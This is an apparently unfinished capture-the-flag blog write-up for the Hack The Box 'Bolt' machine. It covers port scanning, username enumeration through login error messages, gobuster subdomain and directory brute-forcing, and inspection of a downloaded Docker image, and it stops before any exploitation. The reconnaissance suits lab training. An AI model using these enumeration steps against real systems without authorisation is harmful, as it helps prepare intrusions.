<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="[map[name:MindYourPrivacy]]">
<meta name="description" content="Short description of your site here" />
<meta name="keywords" content=", untagged" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://0xade1.github.io/devdraft/posts/2021/10/htb-bolt/" />


    <title>
        
            Htb Bolt :: Poney Island  â€” Welcome to Pwnie Island
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://0xade1.github.io/devdraft/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
    <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="Htb Bolt">
<meta itemprop="description" content="Short description of your site here"><meta itemprop="datePublished" content="2021-10-28T21:26:15+08:00" />
<meta itemprop="dateModified" content="2021-10-28T21:26:15+08:00" />
<meta itemprop="wordCount" content="2103"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
<meta itemprop="keywords" content="untagged," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>

<meta name="twitter:title" content="Htb Bolt"/>
<meta name="twitter:description" content="Short description of your site here"/>




    <meta property="og:title" content="Htb Bolt" />
<meta property="og:description" content="Short description of your site here" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xade1.github.io/devdraft/posts/2021/10/htb-bolt/" /><meta property="og:image" content="https://0xade1.github.io/devdraft"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-28T21:26:15+08:00" />
<meta property="article:modified_time" content="2021-10-28T21:26:15+08:00" />







    <meta property="article:published_time" content="2021-10-28 21:26:15 &#43;0800 &#43;0800" />








    </head>

    
        <body>
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xade1.github.io/devdraft/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text"># cd /draft/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xade1.github.io/devdraft/about/">About</a></li><li><a href="https://0xade1.github.io/devdraft/categories/">Categories</a></li><li><a href="https://0xade1.github.io/devdraft/posts/">Posts</a></li><li><a href="https://0xade1.github.io/devdraft/series/">Series</a></li><li><a href="https://0xade1.github.io/devdraft/tags/">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
  <line x1="16" y1="2" x2="16" y2="6"></line>
  <line x1="8" y1="2" x2="8" y2="6"></line>
  <line x1="3" y1="10" x2="21" y2="10"></line>
</svg>

  2021-10-28 


  
 |

      
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap  ="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        10 minutes 
        |


      
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-file-text">
      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
      <polyline points="14 2 14 8 20 8"></polyline>
      <line x1="16" y1="13" x2="8" y2="13"></line>
      <line x1="16" y1="17" x2="8" y2="17"></line>
      <polyline points="10 9 9 9 8 9"></polyline>
    </svg>
    2103 Words
    |


      

      

      

    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xade1.github.io/devdraft/posts/2021/10/htb-bolt/">Htb Bolt</a>
      </h1>

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/untagged/">untagged</a></span>
        
    </p>


    </div>

      
        <div class="post-excerpt">Short description of your site here</div>
      

      

      <div class="post-content">
        <h2 id="reconnaissance">Reconnaissance</h2>
<pre><code>Open 10.10.11.114:22
Open 10.10.11.114:80
Open 10.10.11.114:443

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
| SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132
| -----BEGIN CERTIFICATE-----
| MIIDozCCAougAwIBAgIUWYR6DcMDhx5i4CpQ5qkkspuUULAwDQYJKoZIhvcNAQEL
[..]
| +uYRUUWj+CdI1oxxYt0SdimXHr81SgE=
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>The frontpage says:</p>
<pre><code>Administration using Admin LTE
</code></pre>
<p>emails found on the website:</p>
<ul>
<li><a href="mailto:support@bolt.htb">support@bolt.htb</a></li>
<li><a href="mailto:sales@bolt.htb">sales@bolt.htb</a></li>
</ul>
<p>possible users enumerated from website pages:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Christopher M. Wood</td>
<td>Sales</td>
</tr>
<tr>
<td>Bonnie M. Green</td>
<td>Marketing</td>
</tr>
<tr>
<td>Neil D. Sims</td>
<td>Invoice</td>
</tr>
</tbody>
</table>
<p>The website allows to test valid user emails because error messages tells you whether the password or the username is invalid:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="mailto:support@bolt.htb">support@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td><a href="mailto:sales@bolt.htb">sales@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>support</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>sales</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td><a href="mailto:admin@bolt.htb">admin@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>admin</td>
<td><code>Access Denied! Invalid password. Please try again.</code></td>
</tr>
<tr>
<td><a href="mailto:christopher@bolt.htb">christopher@bolt.htb</a></td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>christopher</td>
<td>Invalid login. Forbidden.</td>
</tr>
<tr>
<td>etc.</td>
<td>etc.</td>
</tr>
</tbody>
</table>
<p>will go for signup, but we got an <code>Internal Server Error</code>, so we have to look at existing accounts. The lost password section is deactivated.</p>
<p>On the check-email page we receive the below message.</p>
<pre><code>Email verification required
Please verify your email in order to authenticate.
</code></pre>
<p>It seems there is an email verification procedure somewhere, but obscure how it works. It is likely we have to explore what is <strong>Admin LTE</strong> to figure out how this sauce tastes.</p>
<p>We discover two more domains pointing to the same <strong>passbolt</strong> application:</p>
<pre><code>gobuster vhost -u http://bolt.htb -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: demo.bolt.htb (Status: 302) [Size: 219]
</code></pre>
<p>Passbolt is an open source collaborative password manager:</p>
<pre><code>curl -kL -v https://demo.bolt.htb
curl -kL -v https://demo.bolt.htb
curl -k -v https://mail.bolt.htb/auth/login

   / __ \____  _____ ____/ /_  ____  / / /_
  / /_/ / __ `/ ___/ ___/ __ \/ __ \/ / __/
 / ____/ /_/ (__  )__  ) /_/ / /_/ / / /_
/_/    \__,_/____/____/_.___/\____/_/\__/

Open source password manager for teams
Copyright (c) Passbolt SA (https://www.passbolt.com)


This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see http://www.gnu.org/licenses/.


--&gt;
&lt;meta name=&quot;description&quot; content=&quot;Open source password manager for teams&quot;&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;Passbolt, password manager, online password manager, open source password manager&quot;&gt;
&lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;https://passbolt.bolt.htb/favicon.ico&quot; /&gt;
</code></pre>
<h2 id="demobolthtb">demo.bolt.htb</h2>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb">https://demo.bolt.htb</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 403
/css (Status: 301)
/img (Status: 301)
/js (Status: 301)
/register (Status: 301)
/login (Status: 301)
/logout (Status: 301)
/app (Status: 302)
/users (Status: 302)
/fonts (Status: 301)
/groups (Status: 302)
/locales (Status: 301)
/recover (Status: 301)</p>
<p>/users/register
/users/recover
/auth/login</p>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb/auth/">https://demo.bolt.htb/auth/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 302,403
/register (Status: 301)
/login (Status: 200)</p>
<p>gobuster dir -k -u <a href="https://demo.bolt.htb/users/">https://demo.bolt.htb/users/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -b 302,403
/login (Status: 301)
/register (Status: 404)
/recover (Status: 200)</p>
<p>gobuster dir -k -u <a href="https://passbolt.bolt.htb">https://passbolt.bolt.htb</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/auth/">https://passbolt.bolt.htb/auth/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/users/">https://passbolt.bolt.htb/users/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
gobuster dir -k -u <a href="https://passbolt.bolt.htb/app/">https://passbolt.bolt.htb/app/</a> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50</p>
<h2 id="passboltbolthtb">passbolt.bolt.htb</h2>
<pre><code>Access to this service requires an invitation.
This email is not associated with any approved users on this domain. Please contact your administrator to request an invitation link.
</code></pre>
<p>Revisiting <a href="https://passbolt.bolt.htb/check-email">https://passbolt.bolt.htb/check-email</a> shows version 3.2.1</p>
<p>On <a href="https://github.com/passbolt/passbolt_api/releases">https://github.com/passbolt/passbolt_api/releases</a> for next release 3.3.0, it says:</p>
<pre><code>Security
    PB-8047 Fix PBL-02-002 As LU I should logout by posting to the API and the entry point should should be protected by CSRF
    PB-7751 Updates FlySystem dependency to v2.1.1
    SEC-181 Fix information disclosure: recover endpoint should not return user role and name.
</code></pre>
<p>We can check the commits but nothing really pops-out :</p>
<pre><code>commit 24aa8b802feac1bd5587dade674bd5621d0f0c48
Merge: 551832d42b 05e0305c4b
Author: Remy B &lt;remy@passbolt.com&gt;
Date: Mon Oct 25 08:09:32 2021 +0000

Merge branch 'feature/SEC-181-fix-information-disclosure-recover' into 'common'

SEC-181 Fix information disclosure: recover endpoint should not return user role and name.

See merge request passbolt/passbolt-pro-api!308

commit 05e0305c4b5f6986f4f96a04e7d8c742bc17e44d
Author: Cedric Alfonsi &lt;cedric@passbolt.com&gt;
Date: Mon Oct 25 10:04:21 2021 +0200

SEC-181 Fix information disclosure: recover endpoint should not return user role and name.

Signed-off-by: Cedric Alfonsi &lt;cedric@passbolt.com&gt;

commit 1770678e0efa0a812b9ce05cb7cfa809c78945a2
Merge: e53c8cfd8a 551832d42b
Author: Cedric Alfonsi &lt;cedric@passbolt.com&gt;
Date: Sun Oct 24 22:33:57 2021 +0200

Merge branch 'common' into develop
</code></pre>
<h2 id="docker-image">docker image</h2>
<p>On the download page of the website, we are invited to try the service by downloading a docker image. Exploring the image reveals the name of the vendor<code>appseed</code>, and the underlying technology <code>python flask</code>:</p>
<p>cat repositories | jq</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;flask-dashboard-adminlte_appseed-app&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;latest&#34;</span>: <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>cat manifest.json | jq</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Config&#34;</span>: <span style="color:#f1fa8c">&#34;859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;RepoTags&#34;</span>: [<span style="color:#f1fa8c">&#34;flask-dashboard-adminlte_appseed-app:latest&#34;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Layers&#34;</span>: [
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar&#34;</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></td></tr></table>
</div>
</div><p>To Explore the content of the application, we have to Import the archived docker image. It is as simples as <a href="https://computingforgeeks.com/how-to-export-and-import-docker-images-containers/">this</a>:</p>
<pre><code>docker load &lt; /tmp/image.tar
3fc64803ca2d: Loading layer [==================================================&gt;]  4.463MB/4.463MB
73f2f98bc222: Loading layer [==================================================&gt;]   7.68kB/7.68kB
8f2df5d06a26: Loading layer [==================================================&gt;]  62.86MB/62.86MB
a1e4f9dc4110: Loading layer [==================================================&gt;]  57.57MB/57.57MB
f0c4120bc314: Loading layer [==================================================&gt;]  29.79MB/29.79MB
14ec2ed1c30d: Loading layer [==================================================&gt;]  6.984MB/6.984MB
68c03965721f: Loading layer [==================================================&gt;]  3.072kB/3.072kB
fec67b58fd48: Loading layer [==================================================&gt;]  19.97kB/19.97kB
7fa1531c7420: Loading layer [==================================================&gt;]  7.168kB/7.168kB
e45bbea785e3: Loading layer [==================================================&gt;]  15.36kB/15.36kB
ac16908b339d: Loading layer [==================================================&gt;]  8.192kB/8.192kB
Loaded image: flask-dashboard-adminlte_appseed-app:latest
</code></pre>
<p>Slight modification of the run.py is needed so that I can use my host browser:</p>
<ul>
<li>have the flask application run on <strong>0.0.0.0</strong></li>
<li>map the ports docker:5000 to the host:5000</li>
<li>mount the volume to play with its content</li>
</ul>
<p>The flask application is an administration platform. We can register, then login with test:test.</p>
<pre tabindex="0"><code>docker run --rm -it -p 5000:5000 flask-dashboard-adminlte_appseed-app sh
</code></pre><pre><code>/ # vi run.py
/ # cat run.py | grep app.run
app.run('0.0.0.0')
/ # python3 run.py
[2021-10-31 04:33:12,846] INFO in run: DEBUG = True
[2021-10-31 04:33:12,846] INFO in run: Environment = Debug
[2021-10-31 04:33:12,846] INFO in run: DBMS = sqlite:////db.sqlite3
_ Tip: There are .env or .flaskenv files present. Do &quot;pip install python-dotenv&quot; to use them.
_ Serving Flask app &quot;app&quot; (lazy loading)
_ Environment: production
WARNING: This is a development server. Do not use it in a production deployment.
Use a production WSGI server instead.
_ Debug mode: on
_ Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
_ Restarting with stat
[2021-10-31 04:33:13,521] INFO in run: DEBUG = True
[2021-10-31 04:33:13,522] INFO in run: Environment = Debug
[2021-10-31 04:33:13,522] INFO in run: DBMS = sqlite:////db.sqlite3
_ Tip: There are .env or .flaskenv files present. Do &quot;pip install python-dotenv&quot; to use them.
_ Debugger is active! \* Debugger PIN: 959-707-878
172.17.0.1 - - [31/Oct/2021 04:33:25] &quot;GET /login HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:30] &quot;GET /register HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:51] &quot;POST /register HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:33:55] &quot;GET /login HTTP/1.1&quot; 200 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;POST /login HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET / HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET /login HTTP/1.1&quot; 302 -
172.17.0.1 - - [31/Oct/2021 04:34:02] &quot;GET /index HTTP/1.1&quot; 200 -
</code></pre>
<p>it opens <a href="https://github.com/app-generator/flask-dashboard-adminlte">AdminLTE</a> which is an open source product. According to <strong>Adminlte.js</strong>, the current version is: <code>AdminLTE v3.1.0-pre</code>.</p>
<p>Exploring the sqlite database, leads to Nothing as it contains only users I have registered.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sqlite3
</span></span><span style="display:flex;"><span>SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
</span></span><span style="display:flex;"><span>Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
</span></span><span style="display:flex;"><span>Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
</span></span><span style="display:flex;"><span>Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
